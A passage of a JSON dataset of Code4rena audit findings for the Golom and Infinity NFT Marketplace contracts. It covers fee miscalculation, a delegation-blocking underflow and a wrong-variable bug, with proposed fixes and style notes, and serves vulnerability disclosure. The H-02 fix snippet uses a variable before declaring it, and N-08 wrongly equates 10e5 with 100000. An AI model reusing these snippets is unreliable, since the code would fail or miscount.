}\n```\n\n**[0xsaruman (Golom) confirmed](https://github.com/code-423n4/2022-07-golom-findings/issues/240)**\n\n**[0xsaruman (Golom) resolved and commented](https://github.com/code-423n4/2022-07-golom-findings/issues/240#issuecomment-1235391176):**\n > Resolved https://github.com/golom-protocol/contracts/commit/366c0455547041003c28f21b9afba48dc33dc5c7#diff-63895480b947c0761eff64ee21deb26847f597ebee3c024fb5aa3124ff78f6ccR390\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the GolomTrader.sol code, which is part of the 2022-07-golom repository on Github. The bug causes the protocol fee share to be multiplied by the amount twice when being accounted for as a deduction from the total in amount due to the msg.sender taker calculations in _settleBalances(), which is called by fillBid() and fillCriteriaBid() to handle the payouts. This results in the taker receiving less than they are due whenever the amount is greater than one. The severity of the bug is high due to the potential fund loss impact for taker.\n\nThe bug is caused by the code in _settleBalances() using `(o.totalAmt - protocolfee - ...) * amount`, which is `o.totalAmt * amount - ((o.totalAmt * 50) / 10000) * amount * amount - ...`, counting protocol fee extra `amount - 1` times. This can be seen in the code snippet provided in the bug report. \n\nFor example, if the amount is 6, while the protocol fee is 1 ETH, 6 ETH is the total protocol fee and needs to be removed from o.totalAmt * 6 to calculate the taker's part, while 1 ETH * 6 * 6 = 36 ETH is actually removed in the calculation, meaning 30 ETH of the taker's funds will be frozen on the contract balance.\n\nThe bug report recommends mitigating the issue by accounting for the amount once. This can be done by changing the code in _settleBalances() to the code snippet provided in the bug report. This will ensure the protocol fee is multiplied by the amount only once, resulting in the taker receiving the correct amount.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/240",
      "tags": [],
      "finders": [
        "0x52",
        "rbserver",
        "auditor0517",
        "scaraven",
        "rotcivegaf",
        "Limbooo",
        "kaden",
        "ElKu",
        "Lambda",
        "0xSky",
        "zzzitron",
        "Krow10",
        "hyh",
        "obront",
        "wastewa",
        "RustyRabbit"
      ]
    },
    {
      "id": "8728",
      "title": "[H-02] `VoteEscrowDelegation._writeCheckpoint` fails when `nCheckpoints` is 0",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L101><br>\n\n<https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L82-L86><br>\n\nWhen a user call `VoteEscrowDelegation.delegate` to make a delegation, it calls `VoteEscrowDelegation._writeCheckpoint` to update the checkpoint of `toTokenId`. However, if `nCheckpoints` is 0, `_writeCheckpoint` always reverts. What’s worse, `nCheckpoints` would be zero before any delegation has been made. In conclusion, users cannot make any delegation.\n\n### Proof of Concept\n\nWhen a user call `VoteEscrowDelegation.delegate` to make a delegation, it calls `VoteEscrowDelegation._writeCheckpoint` to update the checkpoint of `toTokenId`.<br>\n<https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L82-L86>\n\n        function delegate(uint256 tokenId, uint256 toTokenId) external {\n            require(ownerOf(tokenId) == msg.sender, 'VEDelegation: Not allowed');\n            require(this.balanceOfNFT(tokenId) >= MIN_VOTING_POWER_REQUIRED, 'VEDelegation: Need more voting power');\n\n            delegates[tokenId] = toTokenId;\n            uint256 nCheckpoints = numCheckpoints[toTokenId];\n\n            if (nCheckpoints > 0) {\n                Checkpoint storage checkpoint = checkpoints[toTokenId][nCheckpoints - 1];\n                checkpoint.delegatedTokenIds.push(tokenId);\n                _writeCheckpoint(toTokenId, nCheckpoints, checkpoint.delegatedTokenIds);\n            } else {\n                uint256[] memory array = new uint256[](1);\n                array[0] = tokenId;\n                _writeCheckpoint(toTokenId, nCheckpoints, array);\n            }\n\n            emit DelegateChanged(tokenId, toTokenId, msg.sender);\n        }\n\nif `nCheckpoints` is 0, `_writeCheckpoint` always reverts.<br>\nBecause `checkpoints[toTokenId][nCheckpoints - 1]` will trigger underflow in Solidity 0.8.11<br>\n<https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L101>\n\n        function _writeCheckpoint(\n            uint256 toTokenId,\n            uint256 nCheckpoints,\n            uint256[] memory _delegatedTokenIds\n        ) internal {\n            require(_delegatedTokenIds.length < 500, 'VVDelegation: Cannot stake more');\n\n            Checkpoint memory oldCheckpoint = checkpoints[toTokenId][nCheckpoints - 1];\n            …\n        }\n\n### Recommended Mitigation Steps\n\nFix `_writeCheckpoint`\n\n        function _writeCheckpoint(\n            uint256 toTokenId,\n            uint256 nCheckpoints,\n            uint256[] memory _delegatedTokenIds\n        ) internal {\n            require(_delegatedTokenIds.length < 500, 'VVDelegation: Cannot stake more');\n\n       \n\n            if (nCheckpoints > 0 && oldCheckpoint.fromBlock == block.number) {\n                Checkpoint memory oldCheckpoint = checkpoints[toTokenId][nCheckpoints - 1];\n                oldCheckpoint.delegatedTokenIds = _delegatedTokenIds;\n            } else {\n                checkpoints[toTokenId][nCheckpoints] = Checkpoint(block.number, _delegatedTokenIds);\n                numCheckpoints[toTokenId] = nCheckpoints + 1;\n            }\n        }\n\n**[zeroexdead (Golom) confirmed](https://github.com/code-423n4/2022-07-golom-findings/issues/630)**\n\n**[zeroexdead (Golom) resolved and commented](https://github.com/code-423n4/2022-07-golom-findings/issues/630#issuecomment-1236185600):**\n > Fixed.\n> Ref: https://github.com/golom-protocol/contracts/commit/95e83a1abead683083b7ddf07853a26803c70b88\n\n\n\n***\n\n",
      "summary": "\nThis bug report is regarding a vulnerability in the VoteEscrowDelegation.sol contract. The vulnerability occurs when a user calls the `VoteEscrowDelegation.delegate` function in order to make a delegation. This function calls `VoteEscrowDelegation._writeCheckpoint` which updates the checkpoint of `toTokenId`. However, if `nCheckpoints` is 0, `_writeCheckpoint` always reverts. This is because `checkpoints[toTokenId][nCheckpoints - 1]` will trigger an underflow in Solidity 0.8.11. This means that users cannot make any delegation, resulting in a denial of service.\n\nThe recommended mitigation step for this vulnerability is to fix `_writeCheckpoint` by adding an if statement that checks if `nCheckpoints` is greater than 0 and if the `oldCheckpoint.fromBlock` equals the current block number. If this is true, then the `oldCheckpoint.delegatedTokenIds` should be set to `_delegatedTokenIds`. If it is false, then a new checkpoint should be created with the `block.number` and `_delegatedTokenIds`.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/630",
      "tags": [],
      "finders": [
        "0x52",
        "scaraven",
        "berndartmueller",
        "cryptphi",
        "arcoun",
        "Twpony",
        "Lambda",
        "0xA5DF",
        "MEP",
        "kenzo",
        "Bahurum",
        "simon135",
        "0xsanson",
        "kyteg",
        "0xSky",
        "hansfriese",
        "zzzitron",
        "panprog",
        "CertoraInc",
        "ElKu",
        "GalloDaSballo",
        "JohnSmith",
        "rajatbeladiya",
        "GimelSec"
      ]
    },
    {
      "id": "8727",
      "title": "[H-01] Owner can not set the `ve` address via `RewardDistributor.addVoteEscrow`",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L300><br>\n\n<https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L173><br>\n\nOn the initial `RewardDistributor.addVoteEscrow` call, the owner of the contract can set the `ve` address without a timelock (which is as intended according to the function documentation). However, as the function parameter `_voteEscrow` is not used for the assignment, instead the storage variable `pendingVoteEscrow` (which is not initialized, hence `address(0)`) is used, the `ve` storage variable can not be set to the provided `_voteEscrow` address.\n\nThis prevents setting the `ve` address (`ve` is set to `address(0)`) and therefore prevents `veNFT` holders to claim reward tokens and Ether rewards via `RewardDistributor.multiStakerClaim`.\n\n### Proof of Concept\n\n[RewardDistributor.sol#L300](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L300)\n\n```solidity\nfunction addVoteEscrow(address _voteEscrow) external onlyOwner {\n    if (address(ve) == address(0)) {\n        ve = VE(pendingVoteEscrow); // @audit-info The wrong variable is used. It should be `_voteEscrow`\n    } else {\n        voteEscrowEnableDate = block.timestamp + 1 days;\n        pendingVoteEscrow = _voteEscrow;\n    }\n}\n```\n\n[RewardDistributor.sol#L173](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L173)\n\n```solidity\nfunction multiStakerClaim(uint256[] memory tokenids, uint256[] memory epochs) public {\n    require(address(ve) != address(0), ' VE not added yet'); // @audit-info reverts if `ve` is not initialized\n\n    ...\n}\n```\n\n### Recommended Mitigation Steps\n\nUse the correct function parameter `_voteEscrow`:\n\n```solidity\nfunction addVoteEscrow(address _voteEscrow) external onlyOwner {\n    if (address(ve) == address(0)) {\n        ve = VE(_voteEscrow);\n    } else {\n        voteEscrowEnableDate = block.timestamp + 1 days;\n        pendingVoteEscrow = _voteEscrow;\n    }\n}\n```\n\n**[0xsaruman (Golom) confirmed](https://github.com/code-423n4/2022-07-golom-findings/issues/611)**\n\n**[0xsaruman (Golom) resolved and commented](https://github.com/code-423n4/2022-07-golom-findings/issues/611#issuecomment-1234218994):**\n > Resolved by removing the manually added timelocks and setting the Vote escrow in constructor and a function to change voteescrow by owner\n> \n> https://github.com/golom-protocol/contracts/commit/366c0455547041003c28f21b9afba48dc33dc5c7#diff-359fa403a6143105216e07c066e06ebb7ef2ba2d02f9d5465b042465d3f5bffbR297\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the RewardDistributor.sol code of the 2022-07-golom GitHub repository. The bug affects the `addVoteEscrow` function, which is intended to allow the owner of the contract to set the `ve` address without a timelock. However, the function parameter `_voteEscrow` is not used for the assignment, instead the storage variable `pendingVoteEscrow` (which is not initialized) is used. This prevents setting the `ve` address (`ve` is set to `address(0)`) and therefore prevents `veNFT` holders to claim reward tokens and Ether rewards via `RewardDistributor.multiStakerClaim`.\n\nThe recommended mitigation step is to use the correct function parameter `_voteEscrow`:\n\n```solidity\nfunction addVoteEscrow(address _voteEscrow) external onlyOwner {\n    if (address(ve) == address(0)) {\n        ve = VE(_voteEscrow);\n    } else {\n        voteEscrowEnableDate = block.timestamp + 1 days;\n        pendingVoteEscrow = _voteEscrow;\n    }\n}\n```\n\nThe bug was identified using manual review.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/611",
      "tags": [],
      "finders": [
        "TrungOre",
        "panprog",
        "0x52",
        "0xsanson",
        "rbserver",
        "auditor0517",
        "CRYP70",
        "rajatbeladiya",
        "teddav",
        "berndartmueller",
        "hyh",
        "hansfriese",
        "0x1f8b",
        "Krow10",
        "0xA5DF",
        "GimelSec"
      ]
    },
    {
      "id": "24283",
      "title": "[N-08] Scientific notation",
      "impact": "LOW",
      "content": "\nFor readability, it is best to use scientific notation (e.g `10e5`) rather than decimal literals(`100000`) or exponentiation(`10**5`)\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n[uint32 public WETH_TRANSFER_GAS_UNITS = 50000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L61)\\\n[20000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L202)\\\n[1000000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L381)\\\n[10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L725)\\\n[10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L819)\\\n[10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L873)\\\n[10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1135)\\\n[10\\*\\*4](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1161)\n\n#### InfinityOrderBookComplication.sol\n\n[10\\*\\*4](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L338)\n\n#### InfinityStaker.sol\n\n[uint16 public BRONZE_STAKE_THRESHOLD = 1000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L33)\\\n[uint16 public SILVER_STAKE_THRESHOLD = 5000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L34)\\\n[uint16 public GOLD_STAKE_THRESHOLD = 10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L35)\\\n[uint16 public PLATINUM_STAKE_THRESHOLD = 20000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L36)\\\n[10\\*\\*18](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L237)\n\n### Mitigation\n\nReplace the numbers aforementioned with their scientific notation\n\n**[nneverlander (Infinity) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/299#issuecomment-1163395467):**\n > Thanks\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/299#issuecomment-1183717266):**\n > I love how you name the inlined links -- really improves the readability.\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24282",
      "title": "[N-07] Related data should be grouped in struct",
      "impact": "LOW",
      "content": "\nWhen there are mappings that use the same key value, having separate fields is error prone, for instance in case of deletion or with future new fields.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n    mapping(address => uint256) public userMinOrderNonce;\n    mapping(address => mapping(uint256 => bool)) public isUserOrderNonceExecutedOrCancelled;\n\n### Mitigation\n\nGroup the related data in a struct and use one mapping:\n\n    struct OrderNonce {\n      uint256 userMin;\n      mapping(uint256 => bool) isExecutedOrCancelled;\n    }\n\nAnd it would be used as a state variable:\n\n    mapping(address =>  OrderNonce) orderNonces;\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24281",
      "title": "[N-06] Public functions can be external",
      "impact": "LOW",
      "content": "\nIt is good practice to mark functions as `external` instead of `public` if they are not called by the contract where they are defined.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityStaker.sol\n\n[function getUserTotalStaked()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L154)\\\n[function getUserTotalVested()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L154)\n\n### Mitigation\n\nDeclare these functions as `external` instead of `public`\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24280",
      "title": "[N-05] Function missing comments",
      "impact": "LOW",
      "content": "\nSome functions are missing comments.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n[function \\_emitMatchEvent](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L922)\\\n[function \\_emitTakerEvent](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1005)\\\n[function \\_nftsHash](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1185)\\\n[function \\_tokensHash](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1201)\n\n#### InfinityStaker.sol\n\n[function \\_getDurationInSeconds](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L275)\n\n#### InfinityToken.sol\n\n[function advanceEpoch()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L60)\\\n[function \\_beforeTokenTransfer()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L86)\\\n[function \\_afterTokenTransfer()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L95)\\\n[function \\_mint()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L103)\\\n[function \\_burn()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L107)\\\n[function getAdmin()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L113)\\\n[function getTimelock()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L117)\\\n[function getInflation()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L121)\\\n[function getCliff()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L125)\\\n[function getMaxEpochs()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L129)\\\n[function getEpochDuration()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L133)\n\n### Mitigation\n\nAdd comments to these functions\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24279",
      "title": "[N-04] Events indexing",
      "impact": "LOW",
      "content": "\nEvents should use indexed fields\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n[event CancelAllOrders(address user, uint256 newMinNonce)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L80)\\\n[event CancelMultipleOrders(address user, uint256\\[\\] orderNonces)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L81)\\\n[event NewWethTransferGasUnits(uint32 wethTransferGasUnits))](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L82)\\\n[event NewProtocolFee(uint16 protocolFee)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L83)\\\n[event MatchOrderFulfilled(bytes32 sellOrderHash,bytes32 buyOrderHash,address seller,address buyer,address complication, // address of the complication that defines the execution ,address currency, // token address of the transacting currency,uint256 amount // amount spent on the order)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L85-L92)\\\n[event TakeOrderFulfilled(bytes32 orderHash,address seller,address buyer,address complication, // address of the complication that defines the executionaddress currency, // token address of the transacting currencyuint256 amount // amount spent on the order)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L95-L102)\n\n#### InfinityStaker.sol\n\n[ event Staked(address indexed user, uint256 amount, Duration duration)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L44)\\\n[event DurationChanged(address indexed user, uint256 amount, Duration oldDuration, Duration newDuration)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L45)\\\n[event UnStaked(address indexed user, uint256 amount)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L46)\\\n[event RageQuit(address indexed user, uint256 totalToUser, uint256 penalty)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L47)\n\n#### InfinityToken.sol\n\n[event EpochAdvanced(uint256 currentEpoch, uint256 supplyMinted)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L35)\n\n### Mitigation\n\nAdd indexed fields to these events so that they have the maximum number of indexed fields possible.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24278",
      "title": "[N-03] Constants instead of magic numbers",
      "impact": "LOW",
      "content": "\nIt is best practice to use constant variables rather than literal values to make the code easier to understand and maintain.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n[20000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L202)\\\n[1000000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L381)\\\n[10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L725)\\\n[10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L819)\\\n[10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L873)\\\n[10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1135)\\\n[10\\*\\*4](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1161)\n\n#### InfinityOrderBookComplication.sol\n\n[10\\*\\*4](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L338)\n\n#### InfinityStaker.sol\n\n[10\\*\\*18](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L237)\n\n### Mitigation\n\nDefine constant variables for the literal values aforementioned.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24277",
      "title": "[N-02] Commented code",
      "impact": "LOW",
      "content": "\nThere are portions of commented code in some files.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n[line 1169](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1169)\\\n[line1186](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1186)\\\n[line1202](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1202)\n\n### Mitigation\n\nRemove commented code\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24276",
      "title": "[N-01] Comment Missing function parameter",
      "impact": "LOW",
      "content": "\nSome of the function comments are missing function parameters or returns\n\n### Proof Of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n[bool verifySellOrder](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L462)\\\n[uint256 execPrice](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L677)\\\n[address seller,address buyer,OrderTypes.OrderItem\\[\\] calldata constructedNfts,address currency,uint256 amount](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L835-L840)\\\n[address seller,address buyer,uint256 sellNonce,uint256 buyNonce,OrderTypes.OrderItem\\[\\] calldata constructedNfts,address currency,uint256 amount](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L905-L912)\\\n[OrderTypes.MakerOrder calldata order](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1153)\\\n[OrderTypes.MakerOrder calldata order](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1168)\\\n[address destination,address currency,uint256 amount](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1220-L1223)\\\n[address destination](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1229)\n\n#### InfinityOrderBookComplication.sol\n\n[OrderTypes.MakerOrder calldata sell, OrderTypes.MakerOrder calldata buy](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L169)\\\n[OrderTypes.MakerOrder calldata sell, OrderTypes.MakerOrder calldata buy](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L182)\\\n[OrderTypes.MakerOrder calldata sell,OrderTypes.MakerOrder calldata buy,OrderTypes.OrderItem\\[\\] calldata constructedNfts](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L182-L195)\\\n[OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem\\[\\] calldata takerItems](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L209)\\\n[OrderTypes.MakerOrder\\[\\] calldata orders](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L317)\\\n[OrderTypes.MakerOrder calldata order](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L330)\n\n#### InfinityStaker.sol\n\n[address user,uint256 amount,uint256 noVesting,uint256 vestedThreeMonths,uint256 